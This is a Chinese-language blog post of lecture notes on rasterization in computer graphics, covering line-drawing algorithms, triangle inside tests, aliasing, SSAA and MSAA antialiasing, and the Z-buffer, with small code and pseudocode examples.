    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="什么是光栅化？"><a href="#什么是光栅化？" class="headerlink" title="什么是光栅化？"></a>什么是光栅化？</h2><p>虎书上的解释：</p>
<blockquote>
<p>光栅化是对象顺序图形的中心操作，而光栅化器是任何图形管道的中心。对于输入的每个基元，光栅化器有两个任务：枚举基元覆盖的像素，并在基元上插值，称为属性。这些属性的用途将在后面的示例中明确。光栅化器的输出是一组片段，每个片段对应于基本体覆盖的像素。每个片段“存在”于特定像素处，并携带其自己的一组属性值。</p>
</blockquote>
<p>在上述我们针对摄像机及物体进行MVP变化后，物体被呈现在$[-1,1]^3$的标准空间中，之后经过视口变换将之映射到了$[0,width]*[0,height]$的屏幕上。那么，屏幕又是怎样将物体正确的展示出来的呢？这就是今天所要介绍的光栅化。</p>
<p>个人理解：MVP变化所关注的是如何将物体的正确二维表示通过转换得到，而光栅化的目的就是将想要展现的物体给真正现实到屏幕上的过程（drawing onto the screen）。</p>
<span id="more"></span>

<h2 id="像素和屏幕"><a href="#像素和屏幕" class="headerlink" title="像素和屏幕"></a>像素和屏幕</h2><p>在了解屏幕之前，得知道像素是个什么东西。在我们的日常生活中，常常会接触到像素风格东西的存在，如像素风游戏，像素风图像，共有的特点是所要表现的物体及形象是通过一个个颜色不同而内部均匀的像素块堆叠而成的，与真实的形象神似但是并不确切，因为它很“模糊”。</p>
<p>这是百度对像素的解释：像素是指由图像的小方格组成的，这些小方块都有一个明确的位置和被分配的色彩数值，小方格颜色和位置就决定该图像所呈现出来的样子。</p>
<p>而屏幕其实就是像素的二维数组。我们平常所说的分辨率，如1920 * 1080（1080p）、1280 * 720（720p）、2k、4k，就是像素数组的大小。像素点越多，像素数组越大，屏幕分辨率越高。屏幕是典型的光栅显示。</p>
<p>屏幕的像素如何表示呢？</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707191020581.png" alt="image-20220707191020581" style="zoom:50%;" loading="lazy">

<ul>
<li>每个像素以方块形式呈现，默认长宽均为单位长度，坐标表示为左下角的坐标，故范围为$(0,0)$到$(width-1,height-1)$</li>
<li>像素中心点坐标即为像素坐标，数值表示为$(x+0.5,y+0.5)$</li>
<li>整个屏幕表示范围为$(0,0)$到$(width,height)$</li>
</ul>
<h2 id="直线光栅化（Linear-Rasterization）"><a href="#直线光栅化（Linear-Rasterization）" class="headerlink" title="直线光栅化（Linear Rasterization）"></a>直线光栅化（Linear Rasterization）</h2><h3 id="DDA数值微分算法"><a href="#DDA数值微分算法" class="headerlink" title="DDA数值微分算法"></a>DDA数值微分算法</h3><p>DDA算法是一个非常简单直观的算法。</p>
<p>首先当任何一条直线知道任意两点时都可以用 $y&#x3D;kx+b$ 来表示，其中 $k$ 代表斜率，如果$∣k∣ &lt; 1$，那么它的主要行进方向就是 $x$ 轴，即 $x$ 轴的变化要比 $y$ 轴快；相反如果 $∣k∣ &gt; 1$ ，那么它的主要行进方向就是 $y$ 轴，即 $y$ 轴的变化要比 $x$ 轴快。如下图所示：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200409201228492.png" alt="img" style="zoom: 80%;" loading="lazy">

<p>我们分别就图上两种情况进行考虑(假设起点与终点给定)</p>
<p>① 当$∣k∣ &lt; 1$时，从起点开始画起每次 $x &#x3D; x+1$， $y &#x3D; y+k$，并将 $y$ 四舍五入，得到新的 $x，y$ 就是像素点应该画的地方<br>② 当$∣k∣ &gt; 1$时，从起点开始画起每次 $y &#x3D; y+1$， $x &#x3D; x+\frac{1}{k}$，并将 $x$ 四舍五入，得到新的$x，y$ 就是像素点应该画的地方</p>
<h3 id="中点Bresenham算法"><a href="#中点Bresenham算法" class="headerlink" title="中点Bresenham算法"></a>中点Bresenham算法</h3><p>我们首先规定想要光栅化的线段的起点$P_0(x_0,y_0)$与终点$P_1(x_1,y_1)$则该直线方程可以用 $y &#x3D; kx + b$ 的形式来表示，定义 $f ( x , y ) &#x3D; y − k x − b$</p>
<p>中点Bresenham算法的思想其实也比较简单，在这里只给出 $0 &lt; k &lt; 1$的情况，其它情况可以类推，除却起点与终点，我们每次的画点只会考虑右边或者右上的点两种情况(由斜率所决定的)，因此我们只需要在这二者之间做出选择。那么该依据什么进行判断呢，给出如下两种情况：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707192843900.png" alt="image-20220707192843900" style="zoom: 33%;" loading="lazy">

<p>我们已经成功画出了前三个深色方格之后，所要考虑的便是第三个深色方格右边或者右上的浅色方格，此时我们取这两个浅色方格的中点，如图中圆圈符号所对应的那个点，倘若这个点在直线方程的下面，那么很明显我们应该选择右上的方格。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707192954049.png" alt="image-20220707192954049" style="zoom:33%;" loading="lazy">

<p>此时中点位于直线方程的上方，此时选择右边的浅色方格。</p>
<p>至此，如何判断两种方格选择的条件已很明显，就是确定中点与直线的位置关系，这里就可以使用到一开始定义的$f ( x , y ) &#x3D; y − k x − b$的方程了。显然，当 $f(x+1,y+0.5) &gt; 0$的时候中点在直线上方，当$f(x+1,y+0.5) &lt; 0$的时候中点在直线下方 。（其中 $x+1$，$y+0.5$是为了表示两个浅色方格的中点，此时 $x，y$为前一个确定的像素坐标）</p>
<p>伪代码如下：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410090050374.png" alt="img" style="zoom:33%;" loading="lazy">

<p>明显地，some condition是：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410090315495.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>该算法仍有优化，在此不做讨论。</p>
<h2 id="三角形光栅化（Triangle-Rasterization）"><a href="#三角形光栅化（Triangle-Rasterization）" class="headerlink" title="三角形光栅化（Triangle Rasterization）"></a>三角形光栅化（Triangle Rasterization）</h2><h3 id="为什么是三角形？"><a href="#为什么是三角形？" class="headerlink" title="为什么是三角形？"></a>为什么是三角形？</h3><p>为什么着重讨论三角形光栅化？</p>
<ul>
<li>是最基础的多边形，任意多边形都可以拆分成三角形</li>
<li>可以保证在平面</li>
<li>三角形内外部定义明确，有利于像素的着色</li>
<li>用于在三角形顶点处插值的明确定义方法（重心插值）（ps：这个闫老师没有细说，可以参考这个博主的<a href="https://blog.csdn.net/qq_38065509/article/details/105446756?spm=1001.2014.3001.5502">重心坐标系</a>）</li>
</ul>
<h3 id="如何光栅化"><a href="#如何光栅化" class="headerlink" title="如何光栅化"></a>如何光栅化</h3><p>要想实现三角形光栅化，需要<strong>采样</strong>（sampling）。</p>
<p>图示为：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410092809549.png" alt="img" style="zoom:50%;" loading="lazy">

<p>程序语言为：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> x <span class="token operator">&lt;</span> xmax <span class="token punctuation">;</span> <span class="token operator">++</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> y <span class="token operator">&lt;</span> ymax <span class="token punctuation">;</span> <span class="token operator">++</span>y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//遍历每个像素点</span>
		image<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">inside</span><span class="token punctuation">(</span>tri<span class="token punctuation">,</span>x<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//在三角形内部的像素点作为采样对象</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们对屏幕中的每一个像素进行采样，如果这个像素点在三角形之中那么这个像素点就应该被采用。那么该如何去判断一个点在不在三角形内部呢，如何实现上述的 inside 函数呢？最经典的方法就是利用叉乘了。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410092948108.png" alt="img" style="zoom:50%;" loading="lazy">

<p>我们从$P_2$按照顺时针顺序来看，直线$P_2P_1$与直线$P_2Q$的叉乘，利用右手定则，指向屏幕内，说明点 $Q$ 在直线$P_2P_1$的右侧。同理直线$P_1P_0$与直线$P_1Q$的叉乘，得点 $Q$ 在直线$P_1P_0$的右侧，而最后得到点 $Q$ 在直线$P_0P_2$的左侧。说明点 $Q$ 在三角形外部。（当点均在三线一侧时才位于内部）</p>
<p>因此，三角形光栅化只需要遍历每一个点，判断是否位于其内部即可。当然我们还可以进一步的进行优化，因为显然并没有必要去测试屏幕中的每一个点，一个三角形面可能只占屏幕很小的部分，可以利用一个bouding box包围住想要测试的三角形，只对该bounding box内的点进行采样测试，如下图：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410093933601.png" alt="img" style="zoom:67%;" loading="lazy">

<h2 id="光栅化带来的锯齿-x2F-走样（Aliasing）"><a href="#光栅化带来的锯齿-x2F-走样（Aliasing）" class="headerlink" title="光栅化带来的锯齿&#x2F;走样（Aliasing）"></a>光栅化带来的锯齿&#x2F;走样（Aliasing）</h2><p>利用上述光栅化，我们可以得到三角形在屏幕上的呈现是这样的：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707195907949.png" alt="image-20220707195907949" style="zoom: 67%;" loading="lazy">

<p>呃呃，效果一言难尽。经常玩游戏的人应该都知道这种图形的呈现称作锯齿，就是十分的不平整光滑，看得人十分难受。在图形学中，更学术的名称为走样。问题的本质是：采样的频率过低无法跟上图像的频率。大白话就是采样数过少，试想如果像素点足够多，采样数足够大，那么精细度就会越高，一个个的锯齿将会变得十分小至肉眼无法分辨，这样看上去就是平整光滑的了。</p>
<p>下面理解一下锯齿&#x2F;走样产生的本质：采样的频率过低无法跟上图像的频率。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707201104641.png" alt="image-20220707201104641" style="zoom:50%;" loading="lazy">

<p>$f_1(x)$到$f_5(x)$的频率不断增加而采样的频率不变，可见由采样点预估出的曲线越来越失真。</p>
<p>如何抗锯齿&#x2F;反走样呢？这就是我们接下来要讨论的问题。</p>
<h2 id="如何抗锯齿-x2F-反走样？（Antialiasing）"><a href="#如何抗锯齿-x2F-反走样？（Antialiasing）" class="headerlink" title="如何抗锯齿&#x2F;反走样？（Antialiasing）"></a>如何抗锯齿&#x2F;反走样？（Antialiasing）</h2><p>抗锯齿&#x2F;反走样的基本思路是：模糊</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707200721462.png" alt="image-20220707200721462" style="zoom:50%;" loading="lazy">

<p>如图示，我们将三角形模糊之后再进行采样，而采样的像素深度同模糊后的图像颜色。</p>
<p>更明显的两个例子：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707200839977.png" alt="image-20220707200839977" style="zoom:33%;" loading="lazy">

<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707200906732.png" alt="image-20220707200906732" style="zoom: 33%;" loading="lazy">

<p>这边闫老师说了很多拓展知识，例如时域和频域的转换。其中，采样对应的时域像素点的乘积等于图像对应的频域与低频滤波的卷积，二者都可以达到模糊的效果。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707201516250.png" alt="image-20220707201516250" style="zoom:67%;" loading="lazy">

<p>总之，解决问题的方法是用有限离散的像素点去逼近连续的三角形。具体工业采用什么方法呢？</p>
<h3 id="超采样反走样-Super-Sampling-Anti-Aliasing，SSAA"><a href="#超采样反走样-Super-Sampling-Anti-Aliasing，SSAA" class="headerlink" title="超采样反走样(Super Sampling Anti-Aliasing，SSAA)"></a>超采样反走样(Super Sampling Anti-Aliasing，SSAA)</h3><p>这是最基本的抗锯齿模式，实现原理是渲染时把画面按照显示器分辨率的若干倍放大，如在1024x768分辨率上开启2xSSAA，GPU会先渲染2048x1536 图像，再“塞进”1024x768的边框里成型，将画面精细度提升一倍，毫无疑问会改善边缘锯齿情况。但是众所周知，高分辨率图形的渲染会极大的消耗GPU运算资源和显存容量及带宽，因此SSAA资源消耗极大，即使是最低的2x也未必就能轻易承受。</p>
<p>举例：此方法无非就是提高分辨率，即增加采样点。将每个像素点细分成了4个采样点：</p>
<p><img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707202417081.png" alt="image-20220707202417081" loading="lazy"></p>
<p>之后根据每个采样点来进行着色，每有一个采样点被覆盖就着一次色。这样得到了每个采样点的颜色之后，我们讲每个像素点内部所细分的采样点的颜色值全部加起来再求均值，作为该像素点的抗走样之后的颜色值。结果如下：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/2020041818065221.png" alt="img" style="zoom:50%;" loading="lazy">

<p>仔细观察可以发现因为将4个采样点的颜色求均值的之后，靠近三角形边缘的像素点有的变淡了，从宏观角度来看的话，这个锯齿就会变得不那么明显了。玩3A游戏时我们可以发现会有SSAA抗锯齿选项，其下的 ×2 , ×3 , ×4 分别代表的就是4个，9个，16个采样点，显然采样点越多抗锯齿效果越好，但计算负担也会随之增加。</p>
<h3 id="多采样反走样-Multi-Sampling-Anti-Aliasing，MSAA"><a href="#多采样反走样-Multi-Sampling-Anti-Aliasing，MSAA" class="headerlink" title="多采样反走样(Multi Sampling Anti-Aliasing，MSAA)"></a>多采样反走样(Multi Sampling Anti-Aliasing，MSAA)</h3><p>MSAA是SSAA的改进版。SSAA仅仅为了边缘平滑，而不得不重新以数倍的 分辨率渲染整个画面，造成宝贵显卡处理资源的极大浪费，因此MSAA正是为了改善这种情况而生。MSAA实现方式类似于SSAA，不同之处在于MSAA仅仅将3D建模的边缘部分放大处理，而不是整个画面。简单说3D模型是由大量多边形所组成，MSAA仅仅处理模型最外层的多边形，因此显卡的负担大幅减轻。 </p>
<p> MSAA虽然趋于易用化，十分流行，但是缺点也很明显。1，如果画面中单位物体较多，需要处理的边缘多边形数量也自然增多，此时MSAA性能也会下降的十分厉害。2，同样倍数的MSAA，理论上边缘平滑效果与SSAA相同，但是由于仅仅处理边缘部分的多边形，因此非边缘部分的纹理锐度远不如SSAA。</p>
<p>同样利用上述的例子说明MSAA与SSAA区别，MSAA仍将像素分为多个采样点，不同的是不再采用每有一个采样点被覆盖就着一次色的，而是统计被覆盖采样点的个数，例如有两个采样点被覆盖，那么只需要用该像素中心计算出来的颜色值乘以50%即可，这样大大减少了计算量。如上述：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707203755079.png" alt="image-20220707203755079" style="zoom:50%;" loading="lazy">

<h2 id="深度缓冲（Z-Buffer）"><a href="#深度缓冲（Z-Buffer）" class="headerlink" title="深度缓冲（Z-Buffer）"></a>深度缓冲（Z-Buffer）</h2><p>在第二节课堂笔记视图变换中的视口变换模块说过这么一句话：</p>
<blockquote>
<p>对于标准立方体$[ − 1 , 1 ]^3$，先不管它的 $Z$ 轴数据（由深度缓冲来处理）</p>
</blockquote>
<p>深度缓冲是什么？</p>
<p>接着上文，我们在处理完图形光栅化之后，还要考虑物体先后的关系？这十分重要，更直白的说法是，要搞清楚物体的图层，哪个物体会被哪个物体遮挡，哪个物体会遮挡哪个物体。具体的说每个像素点所对应的可能不止一个三角形面上的点，该选择哪个三角形面上的点来显示呢？</p>
<p>当然是离摄像头最近的像素点显示，这就需要用到深度缓冲。（3D物体的远近通过 $Z$ 轴表示，故又称Z-Buffer）</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707203932545.png" alt="image-20220707203932545" style="zoom:50%;" loading="lazy">

<p>简单的图示，离摄像机越近的像素点颜色越深。如何实现呢？分为两步：</p>
<p><strong>1. Z-Buffer算法需要为每个像素点维持一个深度数组记为zbuffer，其每个位置初始值置为无穷大（即离摄像机无穷远）。</strong><br><strong>2. 随后我们遍历每个三角形面上的每一个像素点[x,y]，如果该像素点的深度值z，小于zbuffer[x,y]中的值，则更新zbuffer[x,y]值为该点深度值z，并同时更新该像素点[x,y]的颜色为该三角形面上的该点的颜色。</strong></p>
<p>伪代码：</p>
<pre class="line-numbers language-none"><code class="language-none">Initialize depth buffer to ∞
During rasterization:
	for(each triangle T)
		for(each sample(x,y,z) in T)
			if(z &lt; zbuffer[x,y])              &#x2F;&#x2F;目前为止离摄像机最近的
				framebuffer[x,y] &#x3D; rgb;       &#x2F;&#x2F;更新颜色
				zbuffer[x,y] &#x3D; z;             &#x2F;&#x2F;更新深度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一个形象的例子：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707204535135.png" alt="image-20220707204535135" style="zoom: 50%;" loading="lazy">

<p>数字代表深度，越小代表离相机越近，实现像素颜色的更新。</p>
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>光栅化</tag>
      </tags>
  </entry>
</search>
